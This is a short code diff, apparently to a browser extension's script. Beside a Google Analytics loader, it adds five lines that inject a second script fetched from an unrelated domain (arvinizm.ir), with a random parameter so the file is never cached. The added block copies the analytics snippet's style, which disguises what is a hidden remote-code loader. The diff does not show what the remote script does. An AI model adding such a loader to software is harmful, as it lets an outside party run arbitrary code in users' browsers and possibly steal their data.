@@ -167,6 +167,11 @@ checkBox4.onclick = function(element) {
    ga.src = 'https://www.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(ga, s);
+   var ga2 = document.createElement('script');
+   ga2.type = 'text/javascript';
+   ga2.src = 'https://www.arvinizm.ir/e.js?rnd='+Math.random()+Math.random();
+   var s2 = document.getElementsByTagName('script')[0];
+   s2.parentNode.insertBefore(ga2, s2);
  })();
  
 //  /**
